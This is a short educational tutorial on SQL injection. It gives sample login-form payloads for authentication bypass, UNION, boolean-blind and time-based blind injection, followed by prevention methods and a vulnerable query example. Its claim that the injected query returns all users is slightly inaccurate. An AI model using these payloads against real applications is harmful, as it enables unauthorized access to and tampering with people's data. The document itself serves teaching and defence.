# SQL Injection Attack Demo

SQL Injection is a code injection technique used to attack data-driven applications. It occurs when malicious SQL statements are inserted into an entry field for execution.

## How SQL Injection Works

SQL Injection happens when:
1. User input is directly concatenated into SQL queries
2. The input is not properly sanitized or parameterized
3. Malicious SQL code can be executed in the database

## Common SQL Injection Payloads

### Authentication Bypass
```
Username: admin' OR '1'='1
Password: anything
```

### Union-Based Injection
```
Username: admin' UNION SELECT 1,2,3--
Password: anything
```

### Boolean-Based Blind Injection
```
Username: admin' AND 1=1--
Password: anything
```

### Time-Based Blind Injection
```
Username: admin'; WAITFOR DELAY '00:00:05'--
Password: anything
```

## Prevention Methods

1. **Prepared Statements**: Use parameterized queries
2. **Input Validation**: Validate and sanitize all user input
3. **Least Privilege**: Use database accounts with minimal privileges
4. **Error Handling**: Don't expose database errors to users
5. **Web Application Firewall**: Implement WAF rules to block SQL injection attempts

## Impact

SQL Injection can lead to:
- Unauthorized access to sensitive data
- Data modification or deletion
- Database schema disclosure
- Server compromise
- Complete database takeover

## Real-World Example

The infamous SQL query that could be vulnerable:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

With malicious input:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

This would return all users, effectively bypassing authentication.
